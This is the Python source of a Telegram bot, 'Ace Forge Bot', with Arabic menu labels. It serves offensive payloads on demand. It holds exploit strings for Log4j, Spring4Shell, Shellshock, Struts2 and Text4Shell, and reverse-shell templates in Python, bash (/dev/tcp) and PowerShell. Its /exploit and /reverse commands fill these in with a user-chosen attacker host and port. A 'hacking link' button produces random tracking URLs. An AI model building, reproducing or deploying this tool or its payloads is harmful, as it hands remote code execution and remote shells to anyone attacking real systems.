#!/usr/bin/env python3
import os
import sys
import time
import random
import string
import threading
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not TOKEN:
    print("❌ TELEGRAM_TOKEN missing")
    sys.exit(1)

RARE_EXPLOITS = {
    "log4j": "${jndi:ldap://{{HOST}}:{{PORT}}/Exploit}",
    "spring4shell": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{2}i",
    "shellshock": "() { :; }; /bin/bash -c 'id'",
    "struts2": "redirect:${%23a%3dnew%20java.lang.ProcessBuilder('id').start()}",
    "text4shell": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
}

REVERSE_SHELLS = {
    "python": '''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{{HOST}}',{{PORT}}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])''',
    "bash": "bash -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1",
    "powershell": "$client = New-Object System.Net.Sockets.TCPClient('{{HOST}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
}

async def start(update, context):
    keyboard = [
        [InlineKeyboardButton("🔗 رابط اختراق", callback_data="link")],
        [InlineKeyboardButton("💀 ثغرات نادرة", callback_data="exploits")],
        [InlineKeyboardButton("🔄 شيل عكسي", callback_data="reverse")],
        [InlineKeyboardButton("📋 معلومات", callback_data="info")]
    ]
    await update.message.reply_text("👹 **Ace Forge Bot**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def button(update, context):
    query = update.callback_query
    await query.answer()
    if query.data == "link":
        aid = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        await query.edit_message_text(f"🔗 **رابط:**\n`https://your-link.onrender.com/?id={aid}`", parse_mode='Markdown')
    elif query.data == "exploits":
        t = "💀 **الثغرات:**\n" + "\n".join(f"🔹 `{n}`" for n in RARE_EXPLOITS) + "\n\n📝 `/exploit <اسم> <HOST> <PORT>`"
        await query.edit_message_text(t, parse_mode='Markdown')
    elif query.data == "reverse":
        t = "🔄 **الشيلات:**\n" + "\n".join(f"🔹 `{n}`" for n in REVERSE_SHELLS) + "\n\n📝 `/reverse <لغة> <HOST> <PORT>`"
        await query.edit_message_text(t, parse_mode='Markdown')
    else:
        await query.edit_message_text(f"🖥️ {sys.platform}\n🐍 {sys.version[:30]}\n🕐 {time.strftime('%Y-%m-%d %H:%M:%S')}")

async def exploit(update, context):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("❗ `/exploit <اسم> <HOST> <PORT>`")
        return
    name, host, port = args[0], args[1], args[2]
    if name not in RARE_EXPLOITS:
        await update.message.reply_text(f"❌ `{name}` غير مدعوم.")
        return
    payload = RARE_EXPLOITS[name].replace("{{HOST}}", host).replace("{{PORT}}", port)
    await update.message.reply_text(f"💀 **{name}**\n`{payload}`", parse_mode='Markdown')

async def reverse(update, context):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("❗ `/reverse <لغة> <HOST> <PORT>`")
        return
    lang, host, port = args[0], args[1], args[2]
    if lang not in REVERSE_SHELLS:
        await update.message.reply_text(f"❌ `{lang}` غير مدعوم.")
        return
    code = REVERSE_SHELLS[lang].replace("{{HOST}}", host).replace("{{PORT}}", port)
    await update.message.reply_text(f"🔄 **{lang}**\n```{lang}\n{code}\n```", parse_mode='Markdown')

async def help(update, context):
    await update.message.reply_text("/start - القائمة\n/exploit <اسم> <HOST> <PORT>\n/reverse <لغة> <HOST> <PORT>\n/help")

app = Flask(__name__)
@app.route('/')
def home(): return "Bot is running!"
@app.route('/health')
def health(): return "OK"

def run_bot():
    app_bot = Application.builder().token(TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CallbackQueryHandler(button))
    app_bot.add_handler(CommandHandler("exploit", exploit))
    app_bot.add_handler(CommandHandler("reverse", reverse))
    app_bot.add_handler(CommandHandler("help", help))
    print("✅ Bot running...")
    app_bot.run_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
